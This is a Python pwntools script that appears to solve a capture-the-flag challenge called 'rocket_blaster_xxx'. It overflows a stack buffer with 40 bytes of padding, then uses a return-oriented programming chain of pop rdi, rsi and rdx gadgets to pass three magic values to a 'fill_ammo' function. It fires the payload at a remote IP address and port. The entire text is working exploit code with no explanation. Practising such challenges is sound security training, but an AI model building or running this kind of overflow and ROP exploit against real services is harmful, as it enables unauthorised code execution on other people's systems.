from pwn import *

address = '83.136.254.158'
port = 41543

context.log_level = 'critical'
context.binary = binary = ELF('./rocket_blaster_xxx')
rop = ROP(binary)

offset = b'A' * 40
arg1 = p64(0xdeadbeef)
arg2 = p64(0xdeadbabe)
arg3 = p64(0xdead1337)
pop_rdi = p64(0x000000000040159f)
pop_rsi = p64(0x000000000040159d)
pop_rdx = p64(0x000000000040159b)
ret = p64(0x000000000040101a)
win_func = p64(binary.symbols.fill_ammo)

payload = offset
payload += pop_rdi
payload += arg1
payload += pop_rsi
payload += arg2
payload += pop_rdx
payload += arg3
payload += ret
payload += win_func

target = remote(address,port)
target.sendafter(b'>> ', payload)
target.recvuntil(b'Ready to launch at: ')
print(target.recvline().strip().decode())
